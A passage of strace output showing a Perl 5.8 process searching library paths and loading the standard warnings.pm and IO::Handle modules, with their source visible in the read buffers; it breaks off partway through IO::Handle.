8463  07:23:33.116654 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116668 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116680 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116698 stat64("/usr/lib/perl5/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116710 stat64("/usr/lib/perl5/warnings.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116723 stat64("/usr/share/perl5/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116735 stat64("/usr/share/perl5/warnings.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116748 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116760 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116782 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.116798 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
8463  07:23:33.116846 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.116877 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.116888 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.116906 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
8463  07:23:33.117265 brk(0x81b6000)    = 0x81b6000
8463  07:23:33.117291 brk(0x81b5000)    = 0x81b5000
8463  07:23:33.117430 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
8463  07:23:33.117893 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
8463  07:23:33.118600 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
8463  07:23:33.118734 read(8, "", 4096) = 0
8463  07:23:33.118747 close(8)          = 0
8463  07:23:33.118975 _llseek(6, 412, [412], SEEK_SET) = 0
8463  07:23:33.118992 _llseek(6, 0, [412], SEEK_CUR) = 0
8463  07:23:33.119002 close(6)          = 0
8463  07:23:33.119042 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8463  07:23:33.119065 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8463  07:23:33.119092 futex(0xb7f5a070, 0x81 /* FUTEX_??? */, 2147483647) = 0
8463  07:23:33.119108 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
8463  07:23:33.119122 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8463  07:23:33.119208 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
8463  07:23:33.119233 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f5e000
8463  07:23:33.119246 mmap2(0xb7f62000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f62000
8463  07:23:33.119262 close(6)          = 0
8463  07:23:33.119967 stat64("/etc/perl/IO/Handle.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.119983 stat64("/etc/perl/IO/Handle.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.119997 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120010 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120023 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120036 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120050 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120062 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120075 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120087 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120100 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120113 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
8463  07:23:33.120133 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.120147 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.120163 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.120179 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to 